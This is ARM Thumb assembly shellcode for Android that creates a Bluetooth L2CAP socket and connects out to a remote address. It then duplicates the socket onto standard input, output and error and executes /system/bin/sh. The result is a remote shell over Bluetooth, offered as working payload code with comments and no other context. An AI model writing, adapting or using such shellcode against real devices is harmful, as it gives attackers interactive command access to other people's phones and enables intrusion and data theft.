.globl main
main:
/* switch to Thumb mode (16-bit ops) */
        .code 32
        add     r1, pc, #1
        bx      r1

/* Thumb instructions follow */
        .code 16

/* socket(2, 1, 0) */
/* socket(31 1, 0) */
/* socket(PF_BLUETOOTH-31, SOCK_SEQPACKET-5, BTPROTO-L2CAP - 0)*/
        mov     r0, #31
        mov     r1, #5 
	mov 	r2, #0
	mov 	r7, #1
        lsl     r7, r7, #8
        add     r7, r7, #25
        svc     1

/* connect(r0, &addr, 16) */
        mov     r6, r0
        add     r1, pc, #0x1c
        mov     r2, #16
        add     r7, #2
        svc     1

/* dup2(r0, 0/1/2) */
        mov     r7, #63
        mov     r1, #2
Lb:
        mov     r0, r6
        svc     1
        sub     r1, #1
        bpl     Lb

/* execve("/system/bin/sh", ["/system/bin/sh", 0], 0) */
        add     r0, pc, #0x14
        sub     r2, r2, r2
        push    {r0, r2}
        mov     r1, sp
        mov     r7, #11
        svc     1

/* struct sockaddr */
.align 2
.short 0x1f /* family - PF_BLUTOOTH */
.short 0x02 /* psm */
.byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 /* bluetooth address */
.short 0x00 /*cid*/
.ascii "/system/bin/sh\0\0"	



